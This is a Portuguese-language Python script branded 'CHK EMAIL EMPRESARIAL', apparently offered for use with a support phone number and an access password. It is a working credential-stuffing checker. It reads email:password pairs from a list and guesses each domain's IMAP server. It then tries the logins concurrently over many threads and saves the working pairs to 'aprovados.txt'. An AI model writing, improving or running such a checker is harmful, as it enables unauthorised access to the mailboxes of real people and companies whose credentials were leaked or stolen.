import imaplib
import threading
import getpass
import ctypes
import re

# Definir título do console
ctypes.windll.kernel32.SetConsoleTitleW("CHK EMAIL EMPRESARIAL")

# Definir cores para impressão no terminal
verde = "\033[92m"
vermelho = "\033[91m"
azul = "\033[34m"
Magenta = "\033[35m"
ciano = "\033[36m"
amarelo = "\033[33m"

print(f"""
{azul}
             88b           d88  88888888888  888b      88    ,ad8888ba,    88888888ba    
             888b         d888  88           8888b     88   d8"'    `"8b   88      "8b  
             88`8b       d8'88  88           88 `8b    88  d8'        `8b  88      ,8P  
             88 `8b     d8' 88  88aaaaa      88  `8b   88  88          88  88aaaaaa8P'  
             88  `8b   d8'  88  88           88   `8b  88  88          88  88     88'    
             88   `8b d8'   88  88           88    `8b 88  Y8,        ,8P  88    `8b    
             88    `888'    88  88           88     `8888   Y8a.    .a8P   88     `8b   
             88     `8'     88  88888888888  88      `888    `"Y8888Y"'    88      `8b  
             
                                                        #######  #        #     #     #     ######  
                                                        #     #  #        #     #    # #    #     # 
                                                        #     #  #        #     #   #   #   #     # 
                                                        #     #  #        #     #  #     #  ######  
                                                        #     #  #        #     #  #######  #       
                                                        #     #  #        #     #  #     #  #       
                                                        #######  #######   #####   #     #  #       
""")

print(f"{verde}-------------------=> SUPORTE (16) 99992-1326 <=-------------------\n")
print(f"{Magenta}                         CHK EMAIL EMPRESARIAL \n")
print(f"{ciano}///////////////////////////// TECNOLOGIA DE ALTA PERFORMANCE /////////////////////////////\n")


def verificar_senha(senha):
    senha_correta = "561"  # Substitua pela senha desejada
    return senha == senha_correta


def salvar_aprovado(email, senha):
    with open('aprovados.txt', 'a', encoding='utf-8') as arquivo:
        arquivo.write(f"{email}:{senha}\n")


def salvar_reprovado(email, senha):
    with open('reprovados.txt', 'a', encoding='utf-8') as arquivo:
        arquivo.write(f"{email}:{senha}\n")


def remover_caracteres_nao_imprimiveis(texto):
    return re.sub(r'[^\x20-\x7E]', '', texto)


def testar_credenciais(email, senha):
    dominio = email.split('@')[1]
    servidores_imap = [f'webmail.{dominio}', f'imap.{dominio}', f'mail.{dominio}']

    for servidor_imap in servidores_imap:
        try:
            # Conectar ao servidor IMAP
            conexao = imaplib.IMAP4_SSL(servidor_imap, port=993)
            conexao.login(email, senha)

            print(f"{verde}Autenticação bem-sucedida para: {email}, no servidor: {servidor_imap}")

            # Salvar o email e senha aprovados
            salvar_aprovado(email, senha)

            # Fechar a conexão
            conexao.logout()

            # Se a autenticação foi bem-sucedida, não é necessário tentar com os outros servidores
            break

        except imaplib.IMAP4.error as e:
            print(f"{vermelho}Reprovado: {email}, no servidor: {servidor_imap}, erro: {str(e)}")
        except Exception as e:
            print(f"{vermelho}Erro inesperado: {str(e)} ao tentar {email} no servidor {servidor_imap}")

    else:
        # Se nenhum dos servidores funcionou, salvar o email e senha reprovados
        salvar_reprovado(email, senha)


# Pedir a senha de acesso (ocultar a senha)
senha_acesso = getpass.getpass("Digite a senha de acesso: ")

# Verificar a senha de acesso
if verificar_senha(senha_acesso):
    # Pedir ao usuário a quantidade de threads desejada
    num_threads = int(input("Digite o número de threads desejado: "))

    # Abrir o arquivo lista.txt e ler linhas
    with open('lista.txt', 'r', encoding='utf-8') as arquivo:
        linhas = arquivo.readlines()

    # Criar uma lista para armazenar as threads
    threads = []

    # Criar e iniciar as threads
    for linha in linhas:
        try:
            email, senha = linha.strip().split(':')
            email, senha = remover_caracteres_nao_imprimiveis(email), remover_caracteres_nao_imprimiveis(senha)
            thread = threading.Thread(target=testar_credenciais, args=(email, senha))
            threads.append(thread)
            thread.start()

            # Limitar o número de threads simultâneas
            if len(threads) >= num_threads:
                for t in threads:
                    t.join()
                threads = []

        except ValueError:
            print(f"{vermelho}Linha inválida encontrada e ignorada: {linha.strip()}")

    # Aguardar até todas as threads restantes terminarem
    for thread in threads:
        thread.join()

    print("Teste concluído.")

else:
    print("Senha incorreta. Acesso negado.")

input("Pressione Enter para sair...")
